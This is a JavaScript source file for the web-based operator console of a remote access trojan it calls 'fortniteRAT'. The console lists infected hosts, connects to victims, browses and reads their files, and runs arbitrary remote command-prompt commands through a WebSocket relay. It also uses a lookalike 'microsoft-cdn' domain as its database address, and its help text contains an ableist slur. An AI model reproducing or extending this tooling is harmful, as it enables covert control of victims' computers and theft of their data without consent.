const terminal_locationName = document.querySelector(".terminal_1");
const terminal_input = document.querySelector(".terminal_2");
const terminal_selector_visual = document.querySelector("#texthoverind");
const version = "INDEV"
const html = ``
const database_url = "http://microsoft-cdn.servehttp.com";
const terminal_linefield = document.querySelector("#biden")
var connected = false;
const commandsOBJ = {
    help: {
        run: help,
        description: "bro are you retarded",
    },
    clr: {
        run: clr,
        description: "clears the terminal"
    },
    connect: {
        run: connect,
        description: `args: [ip]
        connects to an infected target at IP. if IP is not specified it will attempt to reconnect to the last conencted target`
    },
    rename: {
        run: rename,
        description: `args: [name]
        changes the currently connected IP's nickname in the database
        nickname will be shown when using the list command`
    },
    ls: {
        run: ls,
        description: `args: [location] (requires connection)
        lists the contents of current directory
        if location is specified, will list contents of target directory`,
    },
    cd: {
        run: cd,
        description: `args [location] requires connection
        navigates to directory specified`
    },
    read: {
        run: println,
        description: `args: [location] (requires connection)
        reads the file at target location and prints its contents to the terminal`,
    },
    cmd: {
        run: cmd,
        description: `args: [command] (requires connection)
        runs a command remotely through the client's command prompt
        note that this uses a different session of command prompt every time the command is ran`,
    },
    list: {
        run: list,
        description: `gives a list of all infected IPs recieved by the server. note that this list may not be fully accurate; some IPs may be missing and some may be old and invalid.`,
    },
}
var executionHistory = "";
var connectionWS = null;
connectionWS = new WebSocket(`ws://127.0.0.1`)
connectionWS.onopen = () => {
    connected = true;
    println("Websocket connection open, RRT should be functional.")
    terminal_locationName.textContent = "client@fortniteRAT:~$"
    connectionWS.onmessage = (msg) => {
        if(msg.data.includes("IP|")){
            terminal_locationName.textContent = msg.data.slice(3) + "@fortniteRAT:~$";
        }else{
        println(msg.data);
        }

    }
}

       

let closeConnection = (reason) => {
    connectionWS = null;
    println("Middleman websocket closed. Middleman server likely down. Ensure that it's up, then refresh the page. Input has been disabled.")
    terminal_input.remove();

}
connectionWS.onerror = closeConnection;
connectionWS.onclose = closeConnection;
function println(text, special) {
    let array;
    try {
        array = text.split("\n");
    } catch (err) {
        array = [text];
    }
    if (special !== false && special !== undefined) {
        let spanCLI2 = document.createElement("span");
        terminal_linefield.appendChild(spanCLI2);
        spanCLI2.textContent = terminal_locationName.textContent;
        spanCLI2.style.color = "cyan";
    }
    for (let i of array) {
        let spanCLI = document.createElement("span");
        terminal_linefield.appendChild(spanCLI);
        spanCLI.textContent = i;
        terminal_linefield.appendChild(document.createElement("br"));
        terminal_linefield.scrollTo(0, terminal_linefield.scrollHeight)
    }
    return array;
}
async function list() {
    println("Fetching list of infected hosts...");
    let list = await fetch("http://127.0.0.1/list", {method:"GET"});
    let parsedList = await list.text();
    

    println(parsedList);
}
function ls(arg){
    if(connectionWS == null){
        println("ls requires a connection");
        return;
    }
    if(arg !== undefined){
        connectionWS.send("CMD|ls " + arg);
    }else{
        connectionWS.send("CMD|ls");
    }
}

function cd(arg){
    if(connectionWS == null){
        println("cd requires a connection");
        return;
    }
    if(arg !== undefined){
        connectionWS.send("CMD|cd " + arg);
    }else{
        connectionWS.send("CMD|cd");
    }
}
function rename(arg){
    if(connectionWS != null && arg != undefined && arg != "" && arg != " "){
        connectionWS.send("CMD|rename "+arg);
    }else{
        println("Missing argument");
    }
}
function cmd(arg){
    if(connectionWS == null){
        println("cmd requires a connection");
        return;
    }
    if(arg !== undefined){
        connectionWS.send("CMD|cmd " + arg);
    }else{
        connectionWS.send("CMD|cmd");
    }
}

function help(arg) {
    if (arg == undefined) {
        println(`=====[ RRT ]=====
    version number ${version}

    commands: (* - requires to be connected to function, ! - not fully implemented)

        | help [command]
        
        | clr 
        
        | list

        | connect [address]

        *| ls [location]
        
        *| cmd [command]

        *| rename [new name]
        `)
    } else {
        try {
            println(commandsOBJ[arg].description)
        } catch {
            println(`${arg} is not a valid command.`)
            console.log(arg, commandsOBJ)
        }
    }
}
async function connect(ip) {
    let ipentered = false;
    if (ip == undefined) {
        println(`No IP address in connection history. Please provide an IP address to connect to.`)
    } else {
        ipentered = true;
    }
    if (!ipentered) {
        return;
    }
    println("Sending connect request to middleman server...")
    connectionWS.send("CHANGEACTIVE" + ip);

    console.log("egg");
}

function clr() {
    while (terminal_linefield.hasChildNodes())
        terminal_linefield.removeChild(terminal_linefield.lastChild);
}

terminal_input.addEventListener("keypress", function (e) {
    if (e.key == "Enter") {
        if(connected){
        e.preventDefault();
        let fullCMD = terminal_input.value;
        let command = fullCMD
        let arg = undefined;
        if (fullCMD.indexOf(" ") !== -1) {
            command = fullCMD.slice(0, fullCMD.indexOf(" "));
            arg = fullCMD.slice(fullCMD.indexOf(" ") + 1);
        }

        println(fullCMD, true)
        terminal_input.value = "";

        if (fullCMD.indexOf(" ") !== -1) {

        }
        try {
            commandsOBJ[command].run(arg);
        } catch (err) {
            let printedError = "Unhandled error " + err.toString();
            switch (err.toString().slice(0, err.toString().indexOf(":"))) {
                case "SyntaxError":
                    console.log("e")
                    break;
                case "TypeError":
                    printedError = `${command} is not a known command. Type help for a list of commands.`
                    break;
            }
            println(printedError);
        }
    }else{
        println("Please wait for the websocket connection.");
    }
}
})


// Automatic mc chicken flux conducer
setInterval(function () {
    terminal_input.style.width = `calc(100% - ${terminal_locationName.clientWidth + 60}px)`
    terminal_input.focus();
}, 100)
